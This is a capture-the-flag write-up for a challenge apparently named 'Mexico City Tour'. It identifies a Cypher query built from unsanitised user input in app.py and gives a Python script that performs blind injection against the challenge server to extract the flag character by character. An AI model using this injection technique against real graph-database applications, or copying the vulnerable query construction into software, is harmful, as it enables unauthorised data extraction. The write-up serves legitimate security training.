# Mexico City Tour &mdash; Solution

## Introduction

If we open the source code `app.py,` we can see that the application is using a graph database
with neo4j client: `from neo4j import GraphDatabase`.

We can spot vulnerable lines:
`distance_query = f'MATCH (n {{id: {start}}})-[p *bfs]-(m {{id: {end}}}) RETURN size(p) AS distance;'`

This line is vulnerable to injection attacks.
So, we need to construct some queries using the `Cypher Query Language.`

## Find the right attack

`*bfs` is not a standard part of the language, so if we search, we can find some hints:
`https://memgraph.com/docs/querying/differences-in-cypher-implementations`

Another obstacle is that only a number can be returned as a result so that we will need
blid injection attack.

## Attack

We know that the city's name is `FLAG`.
The idea is to find if a node contains the flag. We can assume that the flag begins with `TBTL{`, and here is a Python script for solving this task:

```python3
import requests
import string

url = 'http://ctf.dev.tbtl.io:8001'
flag = 'TBTL{'

while True:
    for i in string.ascii_letters + string.digits + "_{}":
        start = f'0}})-[*bfs]-(m {{name: "FLAG"}}) WHERE startsWith(reduce(accumulator = "", var IN values(m)| var), "{flag+i}") RETURN 1 AS distance;//'
        end = 100
        r = requests.post(f'{url}/search', data={'startStation': start, 'endStation': end})
        if 'Distance is 1' in r.text:
            flag += i
            print(flag)
            break
    if flag[-1] == '}':
        break

print(flag)

```

We got the flag: `TBTL{wh3R3_15_mY_GR4PH_h1dd3n}`
